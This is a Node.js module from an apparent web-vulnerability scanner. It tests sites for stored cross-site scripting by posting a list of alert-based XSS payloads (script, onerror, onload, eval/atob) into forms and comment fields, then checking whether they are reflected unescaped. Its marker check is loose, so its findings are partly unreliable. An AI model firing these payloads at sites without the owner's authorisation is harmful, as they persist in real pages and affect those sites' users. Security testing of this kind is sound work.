/**
 * Stored XSS Detection Module
 * Tests for stored/persistent XSS vulnerabilities in forms and user content
 */

const axios = require("axios");
const cheerio = require("cheerio");
const { URL } = require("url");

const USER_AGENT = "WebIntelX-StoredXSS-Scanner/1.0";
const TIMEOUT = 40000;

// XSS payloads for stored XSS testing
const STORED_XSS_PAYLOADS = [
  "<img src=x onerror=alert('STOREDXSS')>",
  "<script>alert('STOREDXSS')</script>",
  "<svg onload=alert('STOREDXSS')>",
  "<iframe src=javascript:alert('STOREDXSS')>",
  "<body onload=alert('STOREDXSS')>",
  "<input onfocus=alert('STOREDXSS') autofocus>",
  "<details open ontoggle=alert('STOREDXSS')>",
  "<marquee onstart=alert('STOREDXSS')>",
  "'\"><img src=x onerror=alert('STOREDXSS')>",
  "<img src=x id=STOREDXSS onerror=eval(atob('YWxlcnQoJ1NUT1JFWFNTJyk='))>",
];

// Test markers (non-executing identifiers)
const TEST_MARKERS = [
  "STOREDXSS",
  "storedxss",
  "<img src=x",
  "<script>",
  "<svg onload",
];

/**
 * Submits a payload to a form endpoint
 */
async function submitPayload(targetUrl, formData, payload) {
  try {
    console.log(`Submitting payload to: ${targetUrl}`);

    const submitData = { ...formData };
    // Replace form field values with payload
    for (const key in submitData) {
      if (typeof submitData[key] === "string") {
        submitData[key] = payload;
      }
    }

    const response = await axios.post(targetUrl, submitData, {
      timeout: TIMEOUT,
      headers: {
        "User-Agent": USER_AGENT,
        "Content-Type": "application/json",
      },
      validateStatus: () => true,
    });

    return response;
  } catch (error) {
    console.error(`Error submitting payload:`, error.message);
    return null;
  }
}

/**
 * Extracts forms from HTML page
 */
function extractForms(html, baseUrl) {
  const forms = [];
  const $ = cheerio.load(html);

  $("form").each((_, form) => {
    const $form = $(form);
    const action = $form.attr("action") || "";
    const method = ($form.attr("method") || "get").toLowerCase();
    const formUrl = new URL(action || baseUrl, baseUrl).toString();

    const fields = {};
    $form.find("input, textarea, select").each((_, field) => {
      const $field = $(field);
      const name = $field.attr("name");
      const type = $field.attr("type") || "text";
      const value = $field.attr("value") || "";

      if (name && type !== "submit" && type !== "button" && type !== "hidden") {
        fields[name] = value || "test";
      }
    });

    if (Object.keys(fields).length > 0) {
      forms.push({
        url: formUrl,
        method: method,
        fields: fields,
      });
    }
  });

  return forms;
}

/**
 * Checks if payload is stored in page
 */
function checkPayloadStored(html, payload) {
  const htmlString = String(html || "");
  const htmlLower = htmlString.toLowerCase();
  const payloadLower = payload.toLowerCase();

  // Check if payload appears in HTML
  if (htmlLower.includes(payloadLower)) {
    // Check if it's escaped
    const escapedPayload = payload
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#x27;");

    if (!htmlString.includes(escapedPayload)) {
      // Payload is present but not escaped
      return { stored: true, escaped: false };
    } else {
      // Payload is escaped
      return { stored: true, escaped: true };
    }
  }

  // Check for test markers
  for (const marker of TEST_MARKERS) {
    if (htmlLower.includes(marker.toLowerCase())) {
      return { stored: true, escaped: false, marker: marker };
    }
  }

  return { stored: false };
}

/**
 * Tests a form for stored XSS
 */
async function testFormForStoredXSS(form, baseUrl) {
  const findings = [];

  if (form.method !== "post") {
    console.log(`Skipping ${form.method.toUpperCase()} form (only POST tested)`);
    return findings;
  }

  for (const payload of STORED_XSS_PAYLOADS.slice(0, 5)) {
    console.log(`Testing stored XSS payload: ${payload.substring(0, 30)}...`);

    try {
      // Submit payload
      const submitResponse = await submitPayload(form.url, form.fields, payload);
      if (!submitResponse || submitResponse.status >= 400) {
        continue;
      }

      // Wait a bit for processing
      await new Promise((resolve) => setTimeout(resolve, 1000));

      // Re-fetch the page to check if payload is stored
      const fetchResponse = await axios.get(baseUrl, {
        timeout: TIMEOUT,
        headers: { "User-Agent": USER_AGENT },
        validateStatus: () => true,
      });

      if (fetchResponse.status === 200) {
        const stored = checkPayloadStored(fetchResponse.data, payload);
        if (stored.stored && !stored.escaped) {
          findings.push({
            formUrl: form.url,
            payload: payload,
            evidence: stored.marker
              ? `Payload marker "${stored.marker}" found in page response`
              : `Payload found stored in page without proper encoding`,
            confidence: "High",
          });
          break; // Found vulnerability, move to next form
        }
      }

      // Also check form action URL (comment/submission page)
      const actionResponse = await axios.get(form.url, {
        timeout: TIMEOUT,
        headers: { "User-Agent": USER_AGENT },
        validateStatus: () => true,
      });

      if (actionResponse.status === 200) {
        const stored = checkPayloadStored(actionResponse.data, payload);
        if (stored.stored && !stored.escaped) {
          findings.push({
            formUrl: form.url,
            payload: payload,
            evidence: `Payload found stored in form action page without proper encoding`,
            confidence: "High",
          });
          break;
        }
      }
    } catch (error) {
      console.error(`Error testing form:`, error.message);
      continue;
    }
  }

  return findings;
}

/**
 * Tests URL parameters for stored XSS (comment-based)
 */
async function testCommentBasedXSS(targetUrl) {
  const findings = [];
  const urlObj = new URL(targetUrl);

  // Common comment parameter names
  const commentParams = ["comment", "message", "content", "text", "body", "input"];

  for (const paramName of commentParams) {
    for (const payload of STORED_XSS_PAYLOADS.slice(0, 3)) {
      try {
        console.log(`Testing comment-based XSS: ${paramName} = ${payload.substring(0, 30)}...`);

        // Submit via POST
        const submitResponse = await axios.post(
          targetUrl,
          { [paramName]: payload },
          {
            timeout: TIMEOUT,
            headers: {
              "User-Agent": USER_AGENT,
              "Content-Type": "application/json",
            },
            validateStatus: () => true,
          }
        );

        if (submitResponse.status >= 400) {
          continue;
        }

        // Wait for processing
        await new Promise((resolve) => setTimeout(resolve, 1000));

        // Re-fetch page
        const fetchResponse = await axios.get(targetUrl, {
          timeout: TIMEOUT,
          headers: { "User-Agent": USER_AGENT },
          validateStatus: () => true,
        });

        if (fetchResponse.status === 200) {
          const stored = checkPayloadStored(fetchResponse.data, payload);
          if (stored.stored && !stored.escaped) {
            findings.push({
              parameter: paramName,
              payload: payload,
              evidence: `Payload found stored in page response without proper encoding`,
              confidence: "High",
            });
            break;
          }
        }
      } catch (error) {
        console.error(`Error testing comment-based XSS:`, error.message);
        continue;
      }
    }
  }

  return findings;
}

/**
 * Main function to scan for stored XSS vulnerabilities
 */
async function scanStoredXSS(url) {
  console.log(`Starting stored XSS scan for: ${url}`);

  const findings = [];

  try {
    // Fetch the page to find forms
    console.log(`Fetching page to find forms: ${url}`);
    const response = await axios.get(url, {
      timeout: TIMEOUT,
      headers: { "User-Agent": USER_AGENT },
      validateStatus: () => true,
    });

    if (response.status !== 200) {
      console.error(`Failed to fetch page: HTTP ${response.status}`);
      return {
        module: "Stored XSS",
        target: url,
        vulnerable: false,
        evidence: `Failed to fetch page: HTTP ${response.status}`,
        notes: "Unable to analyze page for stored XSS vulnerabilities",
      };
    }

    // Extract forms
    const forms = extractForms(response.data, url);
    console.log(`Found ${forms.length} forms`);

    // Test each form
    for (const form of forms) {
      const formFindings = await testFormForStoredXSS(form, url);
      findings.push(...formFindings);
    }

    // Test comment-based XSS
    const commentFindings = await testCommentBasedXSS(url);
    findings.push(...commentFindings);
  } catch (error) {
    console.error("Stored XSS scan error:", error);
    return {
      module: "Stored XSS",
      target: url,
      vulnerable: false,
      evidence: "Scan failed due to error",
      notes: `Error: ${error.message}`,
    };
  }

  const vulnerable = findings.length > 0;

  return {
    module: "Stored XSS",
    target: url,
    vulnerable: vulnerable,
    evidence: vulnerable
      ? findings.map((f) => ({
          location: f.formUrl || f.parameter || "Unknown",
          payload: f.payload,
          evidence: f.evidence,
          confidence: f.confidence,
        }))
      : "No stored XSS vulnerabilities detected",
    notes: vulnerable
      ? "Stored XSS detected. User input is being stored and displayed without proper sanitization. This can lead to persistent cross-site scripting attacks affecting all users."
      : "No stored XSS vulnerabilities detected in tested forms and parameters.",
  };
}

module.exports = { scanStoredXSS };
